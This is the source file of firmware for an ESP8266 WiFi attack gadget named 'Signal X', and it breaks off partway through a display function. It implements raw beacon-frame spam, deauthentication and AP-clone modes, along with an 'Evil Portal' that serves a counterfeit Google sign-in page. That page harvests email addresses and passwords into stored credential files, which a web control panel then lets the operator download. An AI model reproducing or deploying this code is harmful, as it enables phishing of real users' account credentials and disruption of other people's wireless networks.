#include <Arduino.h>
#include <Wire.h>
#include "SH1106Wire.h"
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <Adafruit_NeoPixel.h>

#define LED_PIN 15
#define NUM_LEDS 1
Adafruit_NeoPixel pixels(NUM_LEDS, LED_PIN, NEO_GRB + NEO_KHZ800);

SH1106Wire display(0x3c, 5, 4);

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

const int BTN_UP = 12;
const int BTN_DOWN = 13;
const int BTN_SELECT = 14;

const int MIN_BRIGHTNESS = 10; 
const int MAX_BRIGHTNESS = 255;
const int DEFAULT_BRIGHTNESS = 128;

int currentBrightness = DEFAULT_BRIGHTNESS;

enum MenuState {
    MAIN_MENU,
    WIFI_SCANNING,
    WIFI_RESULTS,
    DEAUTH_LIST,
    DEAUTH_ACTIVE,
    DEAUTH_INFO,
    PACKET_MON,
    EVIL_PORTAL_MENU,
    EVIL_PORTAL_RUNNING,
    EVIL_PORTAL_CREDS,
    BEACON_RUNNING,
    BEACON_INFO,
    SSID_LIST,
    AP_CLONE_SCAN,
    AP_CLONE_RUNNING,
    FILES_MENU,
    SETTINGS_MENU,
    BRIGHTNESS_SETTING,
    AUTO_SCAN_SETTING,
    SCAN_INTERVAL_SETTING,
    SOUND_SETTING,
    LED_SETTING,
    WIFI_LOCATION,
    WEB_CONTROL_RUNNING,
    ABOUT_SCREEN
};

MenuState currentState = MAIN_MENU;

enum FileMenuState {
    FILE_STORAGE,
    FILE_NETWORKS,
    FILE_CREDS,
    FILE_VIEWING_NETWORKS,
    FILE_VIEWING_CREDS
};

const char* menuItems[] = {
    "WiFi Scan",     
    "Deauth",        
    "Evil Portal",   
    "Packet Mon",    
    "Beacon Spam",   
    "SSID List",     
    "AP Clone",   
    "WiFi Location",    
    "Files",         
    "Settings",
    "Web Control" 
};

const int MENU_ITEMS = 11;
int currentSettingsItem = 0;
const int SETTINGS_ITEMS = 8;
bool autoScanEnabled = false;
int scanInterval = 30; 
unsigned long lastAutoScan = 0;

const char* funnySSIDs[] = {
    "FBI Surveillance Van",
    "Pretty Fly for a WiFi",
    "Wu Tang LAN",
    "Hide Yo Kids Hide Yo WiFi",
    "Bill Wi Science Fi",
    "Router? I Hardly Know Her",
    "LAN Solo",
    "The LAN Before Time",
    "Lord of the Pings",
    "Get Off My LAN",
    "404 Network Unavailable",
    "Mom Use This One",
    "Abraham Linksys",
    "The Promise LAN",
    "Drop It Like Its Hotspot"
};

const int NUM_FUNNY_SSIDS = 15;
unsigned long beaconPacketCount = 0;
unsigned long beaconStartTime = 0;
int currentBeaconChannel = 1;

String locationInfo = "Unknown";
bool locationFound = false;
unsigned long locationRequestTime = 0;

FileMenuState currentFileMenu = FILE_STORAGE;
int currentFileIndex = 0;
int totalFiles = 0;
String currentFiles[50];

String generateRandomSSID() {
    const char* prefixes[] = {"WiFi", "Net", "Home", "Guest", "Private", "Secure", "Fast", "Super", "Ultra", "Mega"};
    const char* suffixes[] = {"Network", "Connect", "Link", "Web", "Zone", "Spot", "Hub", "Access", "Point", "Router"};
    
    String randomSSID = prefixes[random(0, 10)];
    randomSSID += "-";
    randomSSID += suffixes[random(0, 10)];
    randomSSID += "-";
    randomSSID += String(random(100, 999));
    
    return randomSSID;
}

String generateRandomMAC() {
    String mac = "";
    for (int i = 0; i < 6; i++) {
        byte randomByte = random(0, 256);
        if (i > 0) mac += ":";
        if (randomByte < 16) mac += "0";
        mac += String(randomByte, HEX);
    }
    return mac;
}

void loadDirectoryFiles(const char* path) {
    Dir dir = LittleFS.openDir(path);
    currentFileIndex = 0;
    totalFiles = 0;
    
    while (dir.next() && totalFiles < 50) {
        currentFiles[totalFiles] = dir.fileName();
        totalFiles++;
    }
}

void performWiFiScan();
void IRAM_ATTR onPacket(uint8_t *buf, uint16_t len);
void handleDeauthAttack();
void startGooglePortal();

struct NetworkInfo {
    String ssid;
    int32_t rssi;
    uint8_t encType;
    String mac;
    int channel;
};

struct Credentials {
    String email;
    String password;
    String ip;
    String deviceInfo;
    String timestamp;
};
int currentMenuItem = 0;

#define MAX_NETWORKS 50
#define MAX_CREDS 10
NetworkInfo networks[MAX_NETWORKS];
Credentials capturedCreds[MAX_CREDS];
int networkCount = 0;
int currentNetwork = 0;
int credsCount = 0;
int currentPortalItem = 0;
const char* portalItems[] = {"Google", "Amazon", "Apple"};
const int PORTAL_ITEMS = 3;

static unsigned long lastPacketCount = 0;
static unsigned long lastDuration = 0;
unsigned long attackStartTime = 0;
int packetsCount = 0;
String currentTarget = "";

unsigned long lastFileSelectTime = 0;
const unsigned long doubleClickTime = 500; 
int currentChannel = 1;
int packetsPerSecond = 0;
int packetHistory[128] = {0};
int historyIndex = 0;
unsigned long lastSecond = 0;

int lastSelectedFileIndex = -1;

struct DeviceSettings {
  int brightness;
  bool autoScanEnabled;
  int scanInterval;
  uint8_t defaultChannel;
  bool soundEnabled;
  bool ledEnabled;
  uint32_t settingsVersion;
};

DeviceSettings settings;
const char* SETTINGS_FILE = "/config/settings.bin";
const uint32_t CURRENT_SETTINGS_VERSION = 1;

uint32_t LED_OFF = pixels.Color(0, 0, 0);
uint32_t LED_RED = pixels.Color(255, 0, 0);
uint32_t LED_GREEN = pixels.Color(0, 255, 0);
uint32_t LED_BLUE = pixels.Color(0, 0, 255);
uint32_t LED_YELLOW = pixels.Color(255, 255, 0);
uint32_t LED_PURPLE = pixels.Color(255, 0, 255);
uint32_t LED_CYAN = pixels.Color(0, 255, 255);
uint32_t LED_WHITE = pixels.Color(255, 255, 255);

void updateLED() {
    if (!settings.ledEnabled) {
      pixels.setPixelColor(0, LED_OFF);
      pixels.show();
      return;
    }
  
    switch(currentState) {
      case WIFI_SCANNING:
        {
          int brightness = (sin(millis() / 200.0) + 1) * 127;
          pixels.setPixelColor(0, pixels.Color(0, 0, brightness));
        }
        break;
      case DEAUTH_INFO:
      case DEAUTH_ACTIVE:
        {
          int brightness = (sin(millis() / 100.0) + 1) * 127;
          pixels.setPixelColor(0, pixels.Color(brightness, 0, 0));
        }
        break;
      case EVIL_PORTAL_RUNNING:
        {
          int brightness = 200 + (sin(millis() / 500.0) * 55);
          pixels.setPixelColor(0, pixels.Color(brightness, 0, brightness));
        }
        break;
      case PACKET_MON:
        {
          int intensity = map(packetsPerSecond, 0, 50, 20, 255);
          if (packetsPerSecond > 0 && millis() % 50 < 10) {
            intensity = min(255, intensity + 50);
          }
          pixels.setPixelColor(0, pixels.Color(0, intensity, intensity));
        }
        break;
      case BEACON_RUNNING:
      case AP_CLONE_RUNNING:
        {
          int flashSpeed = map(beaconPacketCount % 100, 0, 99, 100, 300);
          if ((millis() / flashSpeed) % 2 == 0) {
            pixels.setPixelColor(0, LED_YELLOW);
          } else {
            pixels.setPixelColor(0, LED_OFF);
          }
        }
        break;
      case MAIN_MENU:
        {
          int brightness = (sin(millis() / 1000.0) + 1) * 64;
          pixels.setPixelColor(0, pixels.Color(0, brightness, 0));
        }
        break;
      case SETTINGS_MENU:
        {
          int brightness = (sin(millis() / 1500.0) + 1) * 40;
          pixels.setPixelColor(0, pixels.Color(brightness, brightness, 100 + brightness));
        }
        break;
      case WEB_CONTROL_RUNNING:
        {
          if ((millis() / 1000) % 2 == 0) {
            pixels.setPixelColor(0, pixels.Color(50, 50, 255));
          } else {
            pixels.setPixelColor(0, pixels.Color(150, 150, 150));
          }
        }
        break;
      default:
        pixels.setPixelColor(0, pixels.Color(20, 20, 20));
        break;
    }
    
    pixels.show();
  }

bool loadSettings() {
  if (!LittleFS.exists(SETTINGS_FILE)) {
    settings.brightness = DEFAULT_BRIGHTNESS;
    settings.autoScanEnabled = false;
    settings.scanInterval = 30;  
    settings.defaultChannel = 1;
    settings.soundEnabled = true;
    settings.ledEnabled = true; 
    settings.settingsVersion = CURRENT_SETTINGS_VERSION;
    return false;
  }
  
  File file = LittleFS.open(SETTINGS_FILE, "r");
  if (!file) {
    return false;
  }

  size_t bytesRead = file.read((uint8_t*)&settings, sizeof(DeviceSettings));
  file.close();

  if (bytesRead != sizeof(DeviceSettings) || settings.settingsVersion != CURRENT_SETTINGS_VERSION) {
    settings.brightness = DEFAULT_BRIGHTNESS;
    settings.autoScanEnabled = false;
    settings.scanInterval = 30;
    settings.defaultChannel = 1;
    settings.soundEnabled = true;
    settings.ledEnabled = true; 
    settings.settingsVersion = CURRENT_SETTINGS_VERSION;
    return false;
  }

  currentBrightness = settings.brightness;
  autoScanEnabled = settings.autoScanEnabled;
  scanInterval = settings.scanInterval;
  currentChannel = settings.defaultChannel;
  
  return true;
}

bool saveSettings() {
  if (!LittleFS.exists("/config")) {
    LittleFS.mkdir("/config");
  }

  settings.brightness = currentBrightness;
  settings.autoScanEnabled = autoScanEnabled;
  settings.scanInterval = scanInterval;
  settings.defaultChannel = currentChannel;
  settings.settingsVersion = CURRENT_SETTINGS_VERSION;

  File file = LittleFS.open(SETTINGS_FILE, "w");
  if (!file) {
    return false;
  }
  
  size_t bytesWritten = file.write((uint8_t*)&settings, sizeof(DeviceSettings));
  file.close();
  
  return (bytesWritten == sizeof(DeviceSettings));
}

const char* webControlHTML = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Signal X - Web Control</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f0f0f0; color: #333; }
            .container { max-width: 800px; margin: 0 auto; padding: 20px; }
            .header { background: #222; color: white; padding: 15px; text-align: center; border-radius: 5px 5px 0 0; }
            .content { background: white; padding: 20px; border-radius: 0 0 5px 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .section { margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
            .section:last-child { border-bottom: none; }
            h1 { margin: 0; }
            h2 { margin-top: 0; color: #444; }
            button { background: #2c3e50; color: white; border: none; padding: 10px 15px; margin: 5px; border-radius: 3px; cursor: pointer; }
            button:hover { background: #34495e; }
            .file-list { max-height: 200px; overflow-y: auto; border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; }
            .file-item { padding: 5px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; }
            .file-item:last-child { border-bottom: none; }
            .file-actions { display: flex; }
            .file-actions button { padding: 3px 8px; margin: 0 3px; font-size: 12px; }
            input[type="file"] { margin: 10px 0; }
            .status { padding: 10px; margin: 10px 0; border-radius: 3px; }
            .success { background: #d4edda; color: #155724; }
            .error { background: #f8d7da; color: #721c24; }
            .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
            @media (max-width: 600px) {
                .grid { grid-template-columns: 1fr; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Signal X - Web Control</h1>
            </div>
            <div class="content">
                <div class="section">
                    <h2>Device Status</h2>
                    <div id="status">Loading...</div>
                </div>
                
                <div class="section">
                    <h2>WiFi Tools</h2>
                    <div class="grid">
                        <button onclick="sendCommand('wifi_scan')">WiFi Scan</button>
                        <button onclick="sendCommand('deauth')">Deauth Attack</button>
                        <button onclick="sendCommand('evil_portal')">Evil Portal</button>
                        <button onclick="sendCommand('packet_monitor')">Packet Monitor</button>
                        <button onclick="sendCommand('beacon_spam')">Beacon Spam</button>
                        <button onclick="sendCommand('ap_clone')">AP Clone</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2>File Management</h2>
                    <div class="file-list" id="fileList">
                        Loading files...
                    </div>
                    
                    <div>
                        <h3>Upload File</h3>
                        <form id="uploadForm" enctype="multipart/form-data">
                            <select id="fileDirectory">
                                <option value="/networks">Networks</option>
                                <option value="/creds">Credentials</option>
                            </select>
                            <input type="file" id="fileInput" name="file">
                            <button type="button" onclick="uploadFile()">Upload</button>
                        </form>
                    </div>
                </div>
                
                <div class="section">
                    <h2>Device Control</h2>
                    <div class="grid">
                        <button onclick="sendCommand('restart')">Restart Device</button>
                        <button onclick="sendCommand('exit_web_control')">Exit Web Control</button>
                    </div>
                </div>
            </div>
        </div>
    
        <script>
            // Fetch device status
            function updateStatus() {
                fetch('/api/status')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('status').innerHTML = `
                            <p>Free Memory: ${data.freeMem} KB</p>
                            <p>Uptime: ${data.uptime} seconds</p>
                            <p>Current Mode: ${data.mode}</p>
                        `;
                    })
                    .catch(error => {
                        document.getElementById('status').innerHTML = `<p class="error">Error fetching status: ${error}</p>`;
                    });
            }
            
            // Load file list
            function loadFiles() {
                fetch('/api/files')
                    .then(response => response.json())
                    .then(data => {
                        const fileList = document.getElementById('fileList');
                        if (data.files.length === 0) {
                            fileList.innerHTML = '<p>No files found</p>';
                            return;
                        }
                        
                        let html = '';
                        data.files.forEach(file => {
                            html += `
                                <div class="file-item">
                                    <span>${file.path}</span>
                                    <div class="file-actions">
                                        <button onclick="downloadFile('${file.path}')">Download</button>
                                        <button onclick="deleteFile('${file.path}')">Delete</button>
                                    </div>
                                </div>
                            `;
                        });
                        fileList.innerHTML = html;
                    })
                    .catch(error => {
                        document.getElementById('fileList').innerHTML = `<p class="error">Error loading files: ${error}</p>`;
                    });
            }
            
            // Send command to device
            function sendCommand(command) {
                fetch('/api/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ command: command }),
                })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    updateStatus();
                })
                .catch(error => {
                    alert('Error sending command: ' + error);
                });
            }
            
            // Upload file
            function uploadFile() {
                const fileInput = document.getElementById('fileInput');
                const directory = document.getElementById('fileDirectory').value;
                
                if (!fileInput.files[0]) {
                    alert('Please select a file to upload');
                    return;
                }
                
                const formData = new FormData();
                formData.append('file', fileInput.files[0]);
                formData.append('directory', directory);
                
                fetch('/api/upload', {
                    method: 'POST',
                    body: formData,
                })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    loadFiles();
                })
                .catch(error => {
                    alert('Error uploading file: ' + error);
                });
            }
            
            // Delete file
            function deleteFile(path) {
                if (confirm('Are you sure you want to delete this file?')) {
                    fetch('/api/delete', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ path: path }),
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert(data.message);
                        loadFiles();
                    })
                    .catch(error => {
                        alert('Error deleting file: ' + error);
                    });
                }
            }
            
            // Download file
            function downloadFile(path) {
                window.location.href = '/api/download?path=' + encodeURIComponent(path);
            }
            
            // Initialize
            updateStatus();
            loadFiles();
            
            // Update status every 5 seconds
            setInterval(updateStatus, 5000);
        </script>
    </body>
    </html>
    )rawliteral";

    void startWebControlServer() {
        WiFi.mode(WIFI_AP);
        WiFi.softAP("Signal-X-Control");

        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

        webServer.on("/", HTTP_GET, []() {
            webServer.send(200, "text/html", webControlHTML);
        });

        webServer.on("/api/status", HTTP_GET, []() {
            String json = "{";
            json += "\"freeMem\":" + String(ESP.getFreeHeap() / 1024) + ",";
            json += "\"uptime\":" + String(millis() / 1000) + ",";
            
            String currentMode = "Idle";
            switch(currentState) {
                case WIFI_SCANNING: currentMode = "WiFi Scanning"; break;
                case DEAUTH_ACTIVE: currentMode = "Deauth Attack"; break;
                case EVIL_PORTAL_RUNNING: currentMode = "Evil Portal"; break;
                case PACKET_MON: currentMode = "Packet Monitor"; break;
                case BEACON_RUNNING: currentMode = "Beacon Spam"; break;
                case AP_CLONE_RUNNING: currentMode = "AP Clone"; break;
                case WEB_CONTROL_RUNNING: currentMode = "Web Control"; break;
                default: currentMode = "Idle"; break;
            }
            
            json += "\"mode\":\"" + currentMode + "\"";
            json += "}";
            
            webServer.send(200, "application/json", json);
        });

        webServer.on("/api/files", HTTP_GET, []() {
            String json = "{\"files\":[";

            Dir networkDir = LittleFS.openDir("/networks");
            bool firstFile = true;
            
            while (networkDir.next()) {
                if (!firstFile) json += ",";
                json += "{\"path\":\"/networks/" + networkDir.fileName() + "\",";
                json += "\"size\":" + String(networkDir.fileSize()) + "}";
                firstFile = false;
            }

            Dir credsDir = LittleFS.openDir("/creds");
            while (credsDir.next()) {
                if (!firstFile) json += ",";
                json += "{\"path\":\"/creds/" + credsDir.fileName() + "\",";
                json += "\"size\":" + String(credsDir.fileSize()) + "}";
                firstFile = false;
            }
            
            json += "]}";
            webServer.send(200, "application/json", json);
        });

        webServer.on("/api/command", HTTP_POST, []() {
            String command = webServer.arg("plain");
            DynamicJsonDocument doc(1024);
            deserializeJson(doc, command);
            String cmd = doc["command"];
            
            String response = "{\"success\":true,\"message\":\"";
            
            if (cmd == "wifi_scan") {
                currentState = WIFI_SCANNING;
                performWiFiScan();
                currentState = WEB_CONTROL_RUNNING;
                response += "WiFi scan completed. Found " + String(networkCount) + " networks.";
            } 
            else if (cmd == "deauth") {
                if (networkCount > 0) {
                    currentNetwork = 0;
                    handleDeauthAttack();
                    response += "Deauth attack started against " + networks[currentNetwork].ssid;
                } else {
                    response = "{\"success\":false,\"message\":\"No networks available. Run a WiFi scan first.";
                }
            }
            else if (cmd == "evil_portal") {
                startGooglePortal();
                response += "Evil Portal started with SSID: Google WiFi";
            }
            else if (cmd == "packet_monitor") {
                wifi_set_channel(currentChannel);
                wifi_promiscuous_enable(1);
                wifi_set_promiscuous_rx_cb(onPacket);

                void IRAM_ATTR onPacket(uint8_t *buf, uint16_t len);
                response += "Packet Monitor started on channel " + String(currentChannel);
            }
            else if (cmd == "beacon_spam") {
                beaconStartTime = millis();
                beaconPacketCount = 0;
                wifi_set_opmode(STATION_MODE);
                wifi_promiscuous_enable(1);
                response += "Beacon Spam attack started";
            }
            else if (cmd == "ap_clone") {
                if (networkCount > 0) {
                    beaconStartTime = millis();
                    beaconPacketCount = 0;
                    wifi_set_opmode(STATION_MODE);
                    wifi_promiscuous_enable(1);
                    response += "AP Clone started with " + String(networkCount) + " networks";
                } else {
                    response = "{\"success\":false,\"message\":\"No networks available. Run a WiFi scan first.";
                }
            }
            else if (cmd == "restart") {
                response += "Restarting device...";
                webServer.send(200, "application/json", response + "\"}");
                delay(1000);
                ESP.restart();
                return;
            }
            else if (cmd == "exit_web_control") {
                response += "Exiting Web Control mode";
                webServer.send(200, "application/json", response + "\"}");
                currentState = MAIN_MENU;
                return;
            }
            else {
                response = "{\"success\":false,\"message\":\"Unknown command: " + cmd;
            }
            
            webServer.send(200, "application/json", response + "\"}");
        });

        webServer.on("/api/upload", HTTP_POST, []() {
            webServer.send(200, "application/json", "{\"success\":false,\"message\":\"No file uploaded\"}");
        }, []() {
            HTTPUpload& upload = webServer.upload();
            static String uploadPath;
            
            if (upload.status == UPLOAD_FILE_START) {
                String directory = webServer.arg("directory");
                if (directory != "/networks" && directory != "/creds") {
                    directory = "/networks";
                }
                
                uploadPath = directory + "/" + upload.filename;

                File file = LittleFS.open(uploadPath, "w");
                if (!file) {
                    webServer.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to create file\"}");
                    return;
                }
                file.close();
            } 
            else if (upload.status == UPLOAD_FILE_WRITE) {
                File file = LittleFS.open(uploadPath, "a");
                if (file) {
                    file.write(upload.buf, upload.currentSize);
                    file.close();
                }
            } 
            else if (upload.status == UPLOAD_FILE_END) {
                webServer.sendHeader("Location", "/");
                webServer.send(303);
            }
        });

        webServer.on("/api/download", HTTP_GET, []() {
            String path = webServer.arg("path");
            if (!path.startsWith("/networks/") && !path.startsWith("/creds/")) {
                webServer.send(400, "application/json", "{\"success\":false,\"message\":\"Invalid path\"}");
                return;
            }
            
            if (!LittleFS.exists(path)) {
                webServer.send(404, "application/json", "{\"success\":false,\"message\":\"File not found\"}");
                return;
            }
            
            File file = LittleFS.open(path, "r");
            if (!file) {
                webServer.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to open file\"}");
                return;
            }
            
            String fileName = path.substring(path.lastIndexOf('/') + 1);
            webServer.sendHeader("Content-Disposition", "attachment; filename=" + fileName);
            webServer.streamFile(file, "application/octet-stream");
            file.close();
        });

        webServer.on("/api/delete", HTTP_POST, []() {
            String data = webServer.arg("plain");
            DynamicJsonDocument doc(1024);
            deserializeJson(doc, data);
            String path = doc["path"];
            
            if (!path.startsWith("/networks/") && !path.startsWith("/creds/")) {
                webServer.send(400, "application/json", "{\"success\":false,\"message\":\"Invalid path\"}");
                return;
            }
            
            if (!LittleFS.exists(path)) {
                webServer.send(404, "application/json", "{\"success\":false,\"message\":\"File not found\"}");
                return;
            }
            
            if (LittleFS.remove(path)) {
                webServer.send(200, "application/json", "{\"success\":true,\"message\":\"File deleted successfully\"}");
            } else {
                webServer.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to delete file\"}");
            }
        });

        webServer.onNotFound([]() {
            webServer.sendHeader("Location", "/");
            webServer.send(302);
        });
        
        webServer.begin();
    }

    void displayWebControlScreen() {
        display.clear();
        display.setFont(ArialMT_Plain_10);

        for (int i = 0; i < 12; i++) {
            display.setColor(WHITE);
            display.drawHorizontalLine(0, i, 128);
        }
        
        display.setColor(BLACK);
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 1, "WEB CONTROL");
        display.setColor(WHITE);

        display.setTextAlignment(TEXT_ALIGN_LEFT);
        display.drawString(0, 15, "SSID:");
        display.drawString(40, 15, "Signal-X-Control");

        display.drawString(0, 27, "IP:");
        display.drawString(40, 27, WiFi.softAPIP().toString());

        int clients = WiFi.softAPgetStationNum();
        display.drawString(0, 39, "Clients:");
        display.drawString(40, 39, String(clients));

        if (clients > 0) {
            int animFrame = (millis() / 300) % 3;
            for (int i = 0; i < 3; i++) {
                int radius = 3 + i*3;
                if (i <= animFrame) {
                    display.drawCircle(100, 39, radius);
                }
            }
            display.drawString(85, 39, "Connected");
        } else {
            int dots = (millis() / 500) % 4;
            String waiting = "Waiting";
            for (int i = 0; i < dots; i++) {
                waiting += ".";
            }
            display.drawString(85, 39, waiting);
        }

        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 51, "Connect to WiFi network");
        display.drawString(64, 62, "then visit " + WiFi.softAPIP().toString());
        
        display.display();
    }

const char* loginHTML = R"(
  <!DOCTYPE html>
  <html>
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Google</title>
      <style>
          body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; background: #fff; }
          .container { width: 100%; max-width: 450px; margin: 0 auto; padding: 40px 20px; box-sizing: border-box; }
          .logo { text-align: center; margin-bottom: 25px; }
          .logo img { width: 75px; }
          h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
          h2 { font-size: 16px; font-weight: 400; text-align: center; margin-bottom: 30px; color: #666; }
          .form-group { margin-bottom: 20px; }
          input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
          .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; float: right; }
          .create-account { color: #1a73e8; text-decoration: none; font-size: 14px; }
      </style>
  </head>
  <body>
      <div class="container">
          <div class="logo">
              <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAABQCAYAAADe6OUzAAAABHNCSVQICAgIfAhkiAAAABl0RVh0..." alt="Google">
          </div>
          <h1>Sign in</h1>
          <h2>Continue to Gmail</h2>
          <form action="/capture" method="POST">
              <div class="form-group">
                  <input type="email" name="email" placeholder="Email or phone" required>
              </div>
              <div class="form-group">
                  <input type="password" name="password" placeholder="Enter your password" required>
              </div>
              <div style="overflow: hidden;">
                  <a href="#" class="create-account">Create account</a>
                  <button type="submit" class="btn">Next</button>
              </div>
          </form>
      </div>
  </body>
  </html>
  )";
  
void sendBeaconPacket(const char* ssid) {
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);

  uint8_t packet[128] = {
      0x80, 0x00,           
      0x00, 0x00,           
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
      0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 
      0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 
      0x00, 0x00,  
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x64, 0x00,           
      0x31, 0x04,           
  };

  for(int i = 10; i < 16; i++) {
      packet[i] = random(256);
      packet[i+6] = packet[i];
  }

  int ssidLen = strlen(ssid);
  packet[36] = 0x00;
  packet[37] = ssidLen;
  memcpy(&packet[38], ssid, ssidLen);

  int packetSize = 38 + ssidLen;
  wifi_send_pkt_freedom(packet, packetSize, 0);
  delay(1);
}

void handleBeaconAttack() {
  static unsigned long lastChannelSwitch = 0;
  if(millis() - lastChannelSwitch > 100) {
      currentBeaconChannel = (currentBeaconChannel % 13) + 1;
      wifi_set_channel(currentBeaconChannel);
      lastChannelSwitch = millis();
  }

  for(int i = 0; i < NUM_FUNNY_SSIDS; i++) {
      sendBeaconPacket(funnySSIDs[i]);
  }
  beaconPacketCount += NUM_FUNNY_SSIDS;
}

void displayBeaconInfo() {
  display.clear();
  display.setFont(ArialMT_Plain_10);

  for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
  }
  
  display.setColor(BLACK);
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  display.drawString(64, 1, "BEACON ATTACK");
  display.setColor(WHITE);

  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(0, 15, "Status: Active");
  int animFrame = (millis() / 200) % 4;
  for (int i = 0; i < 4; i++) {
      if (i <= animFrame) {
          display.fillCircle(100 + i*6, 18, 2);
      } else {
          display.drawCircle(100 + i*6, 18, 2);
      }
  }
  
  unsigned long duration = (millis() - beaconStartTime) / 1000;
  String timeStr = String(duration) + "s";
  display.drawString(0, 27, "Duration: " + timeStr);
  
  display.drawString(0, 39, "SSIDs: " + String(NUM_FUNNY_SSIDS));

  display.drawString(0, 51, "Packets: " + String(beaconPacketCount));
  int packetBarWidth = min(80, static_cast<int>(beaconPacketCount % 100));
  display.drawProgressBar(60, 52, 60, 8, packetBarWidth);
  
  display.display();
}

String getEncryptionType(uint8_t type) {
  switch (type) {
      case ENC_TYPE_WEP: return "WEP";
      case ENC_TYPE_TKIP: return "WPA";
      case ENC_TYPE_CCMP: return "WPA2";
      case ENC_TYPE_NONE: return "OPEN";
      default: return "AUTO";
  }
}

String getSignalStrength(int32_t rssi) {
  if (rssi >= -50) return "Excellent";
  if (rssi >= -60) return "Good";
  if (rssi >= -70) return "Fair";
  return "Poor";
}

void drawDotIndicators() {
    const int dotSpacing = 10;
    const int dotRadius = 3;
    const int totalWidth = (MENU_ITEMS * dotSpacing);
    int startX = 64 - (totalWidth / 2);
    
    for(int i = 0; i < MENU_ITEMS; i++) {
        if(i == currentMenuItem) {
            display.fillCircle(startX + (i * dotSpacing), 58, dotRadius);
        } else {
            display.drawCircle(startX + (i * dotSpacing), 58, dotRadius);
        }
    }
}

void saveNetworksToFile() {
  String filename = "/networks/scan_" + String(millis()) + ".txt";
  File file = LittleFS.open(filename, "w");
  
  for(int i = 0; i < networkCount; i++) {
      String networkInfo = networks[i].ssid + "," + 
                         String(networks[i].rssi) + "," +
                         getEncryptionType(networks[i].encType) + "," +
                         networks[i].mac + "," +
                         String(networks[i].channel) + "\n";
      file.print(networkInfo);
  }
  file.close();
}

void displaySavedNetworks() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "FOUND NETWORKS");
    display.setColor(WHITE);
    
    display.setTextAlignment(TEXT_ALIGN_LEFT);
    
    if (networkCount == 0) {
        display.drawString(0, 32, "No networks found");
        display.drawString(0, 44, "Run a WiFi scan first");
    } else {
        int startIdx = (currentNetwork / 4) * 4;
        int itemsToShow = min(4, networkCount - startIdx);
        
        for(int i = 0; i < itemsToShow; i++) {
            int actualIdx = startIdx + i;
            String itemText = networks[actualIdx].ssid;
            
            if(itemText.length() > 16) {
                itemText = itemText.substring(0, 14) + "..";
            }
            
            if(actualIdx == currentNetwork) {
                display.fillRect(0, 14 + (i * 12), 128, 11);
                display.setColor(BLACK);
            }
            
            display.drawString(2, 14 + (i * 12), itemText);
            display.setColor(WHITE);
        }

        if (startIdx + itemsToShow < networkCount) {
            display.drawString(2, 52, "More networks...");
        } else {
            if (currentNetwork == networkCount) {
                display.fillRect(0, 52, 128, 11);
                display.setColor(BLACK);
            }
            display.drawString(2, 52, "Save to File");
            display.setColor(WHITE);
        }
    }
    
    display.display();
  }

  void displayFileContents() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    String headerText = (currentFileMenu == FILE_VIEWING_NETWORKS) ? "NETWORK FILES" : "CREDENTIAL FILES";
    display.drawString(64, 1, headerText);
    display.setColor(WHITE);
    
    if (totalFiles == 0) {
      display.drawString(64, 32, "No files found");
    } else {
      display.setTextAlignment(TEXT_ALIGN_RIGHT);
      display.drawString(126, 14, String(currentFileIndex + 1) + "/" + String(totalFiles));

      display.setTextAlignment(TEXT_ALIGN_LEFT);
      int startIdx = (currentFileIndex / 3) * 3;
      int endIdx = min(startIdx + 3, totalFiles);
      
      for (int i = startIdx; i < endIdx; i++) {
        String fileName = currentFiles[i];
        if (fileName.length() > 20) {
